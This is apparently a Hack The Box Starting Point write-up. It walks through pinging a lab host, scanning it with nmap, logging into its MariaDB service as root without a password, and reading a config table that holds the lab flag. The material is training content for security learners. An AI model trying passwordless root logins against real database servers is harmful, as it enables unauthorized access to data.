#vulnerability-assessment #databases #mysql #sql #weak-credentials #reconnaissance 

# 0. Theory

The reason web servers and other services use databases such as MySQL, MariaDB, or other technologies is to store the accumulated data somewhere easily accessible and well-organized.
Learning how to navigate databases is of considerable importance because most of the critical data is stored in them, including usernames and passwords, which can potentially be used to gain the highest privileged access to the target system.

This exercise covers the scenario when we won't need to access the SQL Service through the web application hosted on the target. Instead we will find a direct way of interacting with the SQL Service.


**During our scan, which port do we find serving MySQL?**
*3306*

**When using the MySQL command line client, what switch do we need to use in order to specify a login username?**
*-u*



# 1. Recon

Verify target and availability.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.26]─[scrage@htb-8pyoa9douu]─[~]
	└──╼ [★]$ ping 10.129.131.202 -c 4
	PING 10.129.131.202 (10.129.131.202) 56(84) bytes of data.
	64 bytes from 10.129.131.202: icmp_seq=1 ttl=63 time=8.38 ms
	64 bytes from 10.129.131.202: icmp_seq=2 ttl=63 time=7.96 ms
	64 bytes from 10.129.131.202: icmp_seq=3 ttl=63 time=8.18 ms
	64 bytes from 10.129.131.202: icmp_seq=4 ttl=63 time=7.99 ms
	
	--- 10.129.131.202 ping statistics ---
	4 packets transmitted, 4 received, 0% packet loss, time 3002ms
	rtt min/avg/max/mdev = 7.962/8.126/8.376/0.167 ms


# 2. Enumeration

We start with an `nmap` scan looking for open ports and services, with the script and version scan flags enabled.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.26]─[scrage@htb-8pyoa9douu]─[~]
	└──╼ [★]$ nmap -sC -sV 10.129.131.202
	Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-30 04:26 CDT
	Nmap scan report for 10.129.131.202
	Host is up (0.0079s latency).
	Not shown: 999 closed tcp ports (reset)
	PORT     STATE SERVICE VERSION
	3306/tcp open  mysql?
	| mysql-info: 
	|   Protocol: 10
	|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
	|   Thread ID: 87
	|   Capabilities flags: 63486
	|   Some Capabilities: LongColumnFlag, IgnoreSigpipes, Support41Auth, SupportsCompression, ConnectWithDatabase, SupportsTransactions, FoundRows, Speaks41ProtocolOld, InteractiveClient, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, ODBCClient, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
	|   Status: Autocommit
	|   Salt: ?)M+.CI#o,*.FTV26Z@r
	|_  Auth Plugin Name: mysql_native_password
	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 199.25 seconds

We only found one open port: **3306**, which runs a service named `MySQL 5.5.5-10.3.27-MariaDB0+deb10u1`. MySQL is a service designed for database management.


# 3. Foothold

In order to communicate with the database, we need to install either `mysql` or `mariadb` on our local machine. To do that, you need to run the following command. Make sure to include the `*` symbol at the end of the command to include all the related MySQL packages available.

	sudo apt update && sudo apt install mysql*

After the installation is done, we check the `--help` of the `mysql` command as usual.

Note that the MySQL clients usually authenticate with the service with a username/password combination. However, it is essential to test for passwordless authentication, as there might be an intentional misconfiguration in the service, which would allow personnel to easily log into the service during the deployment stage of the project to easily interact with it before making it available to other colleagues.
We can try to log in as `admin` or `root` user, naturally having the highest privileges on the system.

	-h : Connect to host.
	-u : User for log-in if not current user.


	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.26]─[scrage@htb-8pyoa9douu]─[~]
	└──╼ [★]$ mysql -h 10.129.131.202 -u root
	Welcome to the MariaDB monitor.  Commands end with ; or \g.
	Your MariaDB connection id is 96
	Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10
	
	Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
	
	Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
	
	MariaDB [(none)]>

With some luck, we're in the MySQL service shell on the host machine, and we can explore the tables and data it holds.

[MySQL Cheat Sheet is available here.](https://www.mysqltutorial.org/mysql-cheat-sheet/)

	SHOW databases; : Prints out the databases we can access.
	USE {database_name}; : Set to use the database named {database_name}.
	SHOW tables; : Prints out the available tables inside the current database.
	SELECT * FROM {table_name}; : Prints out all the data from the table {table_name}.

We can look around the databases and in their tables.

	MariaDB [(none)]> show databases;
	+--------------------+
	| Database           |
	+--------------------+
	| htb                |
	| information_schema |
	| mysql              |
	| performance_schema |
	+--------------------+
	4 rows in set (0.013 sec)
	
	MariaDB [(none)]> use htb;
	Reading table information for completion of table and column names
	You can turn off this feature to get a quicker startup with -A
	
	Database changed
	MariaDB [htb]> show tables;
	+---------------+
	| Tables_in_htb |
	+---------------+
	| config        |
	| users         |
	+---------------+
	2 rows in set (0.008 sec)

Checking one of the tables we find the exercise's flag.

	MariaDB [htb]> select * from config;
	+----+-----------------------+----------------------------------+
	| id | name                  | value                            |
	+----+-----------------------+----------------------------------+
	|  1 | timeout               | 60s                              |
	|  2 | security              | default                          |
	|  3 | auto_logon            | false                            |
	|  4 | max_size              | 2M                               |
	|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
	|  6 | enable_uploads        | false                            |
	|  7 | authentication_method | radius                           |
	+----+-----------------------+----------------------------------+
	7 rows in set (0.008 sec)



https://www.hackthebox.com/achievement/machine/2057492/403
![[Pasted image 20240830115050.png]]